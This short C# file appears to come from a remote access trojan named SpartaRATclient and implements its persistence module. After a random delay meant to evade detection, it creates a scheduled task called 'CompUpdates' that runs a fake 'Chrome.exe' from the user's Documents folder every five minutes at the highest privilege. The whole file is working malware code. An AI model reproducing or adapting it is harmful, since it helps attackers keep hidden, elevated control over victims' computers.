using SpartaRATclient.Tools;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Threading;

namespace SpartaRATclient
{
    public class schtask
    {
        //Persistence
        public void Create()
        {
            Random rnd = new Random();
            Thread.Sleep(rnd.Next(70_000, 100_000));

            string NewCurrentProgramPath = @"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe";
            Powershell PowershellCommand = new Powershell();
            PowershellCommand.Run("schtasks /create /sc minute /mo 5 /tn CompUpdates /tr \"" + NewCurrentProgramPath + "\" /rl HIGHEST");
        }
    }
}
